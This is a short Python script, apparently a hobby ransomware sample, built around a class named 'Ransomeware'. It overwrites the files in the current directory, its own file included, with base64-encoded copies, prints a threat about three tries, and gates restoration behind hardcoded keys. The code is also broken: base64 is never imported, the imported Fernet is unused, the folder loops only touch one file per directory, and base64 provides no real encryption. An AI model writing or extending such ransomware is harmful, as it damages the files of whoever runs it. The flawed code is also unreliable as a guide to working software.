#Import the necessary libraries
import os, sys
import logging
from cryptography.fernet import Fernet

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s: %(message)s')

logging.critical("You only have 3 tries to decrypt your files")

class Ransomeware:
	def __init__(self, name):
		self.name = name
		self.files = os.listdir()
		self.keys = ['fuschia', 'rambunctious', 'serendipity']
		self.Encryfolders = []
		self.Decryfolders = []

	def Encrypt(self, file):
		with open(file, 'rb') as file_name:
			Content = file_name.read()
			EncryptedContent = base64.b64encode(Content)
			logging.info(f'File {file} has been encrypted')

		with open(file, 'wb') as f:
			f.write(EncryptedContent)

	def FolderEncrypt(self):
		for folder in self.Encryfolders:
			for path, foldername, filename in os.walk(folder):
				with open(f'{path}\\{filename[0]}', "rb") as file:
					Content = file.read()
					EncryptedContent = base64.b64encode(Content)

				with open(f'{path}\\{filename[0]}', "wb") as file:
					file.write(EncryptedContent)
					logging.info(f'File {filename[0]} has been encrypted')

	def FileEncrypt(self):
		for file in self.files:
			if os.path.isfile(file):
				if file == 'ransomeware.py':
					self.Encrypt(file)
				else:
					self.Encrypt(file)
			else:
				self.Encryfolders.append(file)

	def Decrypt(self, file):
		with open(file, 'rb') as file_name:
			Content = file_name.read()
			DecryptedContent = base64.b64decode(Content)

		with open(file, 'wb') as f:
			f.write(DecryptedContent)
			logging.info(f'File {file} has been decrypted')

	def FolderDecrypt(self):
		for folder in self.Decryfolders:
			for path, foldername, filename in os.walk(folder):
				with open(f'{path}\\{filename[0]}', "rb") as file:
					Content = file.read()
					DecryptedContent = base64.b64decode(Content)

				with open(f'{path}\\{filename[0]}', "wb") as file:
					file.write(DecryptedContent)
					logging.info(f'File {filename[0]} has been decrypted')

	def FileDecrypt(self):
		for file in self.files:
			if os.path.isfile(file):
				if file == 'key.key' or file == 'ransomeware.py':
					self.Decrypt(file)
				else:
					self.Decrypt(file)
			else:
				self.Decryfolders.append(file)

	def initEncrypt(self):
		self.FileEncrypt()
		self.FolderEncrypt()

	def initDecrypt(self):
		self.FileDecrypt()
		self.FolderDecrypt()

	def startDecrypt(self):
		for i in range(3):
			key = input('Enter key: ')
			if key != self.keys[i]:
				print("Key is incorrect\nIt has been changed")
			else:
				self.initDecrypt()
				break

if __name__ == '__main__':
	FileEncrypter = Ransomeware('Ransomeware')
	FileEncrypter.initEncrypt()
	FileEncrypter.startDecrypt()
